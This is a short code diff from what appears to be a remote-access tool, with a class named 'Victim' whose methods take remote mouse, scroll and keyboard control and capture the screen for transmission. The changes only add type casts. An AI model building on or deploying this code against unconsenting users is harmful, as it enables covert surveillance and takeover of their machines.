@@ -121,13 +121,13 @@ int Victim::controlVictim()
             float x = a / (256.f * 256.f) * screenSize.x;
             float y = b / (256.f * 256.f) * screenSize.y;
             if (controlMouse)
-                mousePos = Mlib::Vec2i(x, y);
+                mousePos = Mlib::Vec2i(int(x), int(y));
         }
         //wheel scrolled
         else if (cmd == 'k') {
             sf::Int8 delta;
             p >> delta;
-            Mlib::Mouse::simulateScroll(delta * 100.f);
+            Mlib::Mouse::simulateScroll(int(delta * 100.f));
         }
         //start/stop controlling keyboard
         else if (cmd == 'a' || cmd == 'z') {
@@ -417,9 +417,10 @@ void Victim::shareScreen()
         char* sendBuffer = new char[1280 * 720];
         for (int y = 0; y < 720; y++) {
             for (int x = 0; x < 1280; x++) {
-                int xS = x / 1280.f * width, yS = y / 720.f * height;
+                int xS = int(x / 1280.f * width); 
+                int yS = int(y / 720.f * height);
                 int i = (yS * width + xS) * 4;
-                sendBuffer[y * 1280 + x] = (bitmapData[i] + bitmapData[i + 1] + bitmapData[i + 2]) / 3.f;
+                sendBuffer[y * 1280 + x] = char((bitmapData[i] + bitmapData[i + 1] + bitmapData[i + 2]) / 3.f);
             }
         }
         
